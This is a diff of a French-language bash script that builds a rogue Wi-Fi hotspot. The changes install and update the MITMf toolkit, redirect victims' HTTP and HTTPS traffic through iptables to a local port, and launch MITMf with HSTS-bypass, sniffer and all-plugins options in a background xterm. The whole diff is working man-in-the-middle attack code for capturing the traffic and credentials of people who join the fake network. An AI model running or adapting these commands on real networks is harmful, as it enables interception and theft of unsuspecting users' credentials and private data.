@@ -30,17 +30,24 @@ if [[ ! -x /usr/sbin/dhcpd ]];then
 fi
 #MITMf
 if [[ ! -x /etc/MITMf ]];then
-  echo -e "$warn\nVous devez installer net-creds"
+  echo -e "$warn\nVous devez installer MITMf"
   sleep 1
   echo -e "$q\nVoulez-vous le faire maintenant ? (y/n)"
   read var
   if [[ $var == y ]];then
     cd /etc
     git clone https://github.com/byt3bl33d3r/MITMf.git
-    apt-get install python-scapy python
+    apt-get install python
+    cd MITMf
+    pip install -r requirements.txt
+    ./setup.sh
   else
     exit_fn
   fi
+else
+  cd /etc/MITMf
+  ./update.sh
+  cd /etc/myHotspot
 fi
 
 # Initialisation
@@ -110,11 +117,8 @@ iptables -t nat -A PREROUTING -p udp -j DNAT --to $gatewayip
 iptables -P FORWARD ACCEPT
 iptables --append FORWARD --in-interface at0 -j ACCEPT
 iptables --table nat -A POSTROUTING --out-interface $internet_interface -j MASQUERADE
-iptables --table nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $listenport
+iptables --table nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $listenport   #HTTP
 iptables --table nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-ports $listenport #HTTPS
-iptables --table nat -A PREROUTING -p tcp --destination-port 993 -j REDIRECT --to-ports $listenport #IMAPS
-iptables --table nat -A PREROUTING -p tcp --destination-port 995 -j REDIRECT --to-ports $listenport #POP3S
-iptables --table nat -A PREROUTING -p tcp --destination-port 6697 -j REDIRECT --to-ports $listenport #IRC
 sleep 3
 
 # DHCP
@@ -130,7 +134,8 @@ sleep 3
 # SSLStrip
 echo -e "$info\n[+]Configuration et démarrage de MITMf $txtrst"
 cd /etc/MITMf
-python mitmf.py -i at0 --hsts --sniffer
+xterm -xrm '*hold: true' -geometry 100x25+1+400 -T MITMf -e python mitmf.py -i at0 --hsts --sniffer -a & mitmfid=$!
+disown
 cd /etc/myHotspot
 
 clear
